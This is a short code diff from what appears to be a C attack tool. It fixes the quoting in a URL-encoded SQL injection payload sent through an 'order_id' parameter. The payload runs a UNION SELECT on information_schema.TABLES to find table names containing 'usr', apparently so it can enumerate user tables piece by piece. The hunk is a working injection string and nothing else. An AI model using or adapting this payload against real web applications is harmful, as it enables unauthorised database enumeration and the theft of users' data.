@@ -206,7 +206,7 @@ bool recv_empty(int32_t sockfd) {
     return ptr;
 }
 
-#define PAYLOAD_BEGIN "order_id=0%20UNION%20SELECT%20table_name%20FROM%20information_schema.TABLES%20WHERE%20table_name%20LIKE%20%27%25usr%25%27%20AND%20table_name%20LIKE%20%25"
+#define PAYLOAD_BEGIN "order_id=0%20UNION%20SELECT%20table_name%20FROM%20information_schema.TABLES%20WHERE%20table_name%20LIKE%20%27%25usr%25%27%20AND%20table_name%20LIKE%20%27"
 #define PAYLOAD_END "%25%27%20LIMIT%201%3b"
 
 
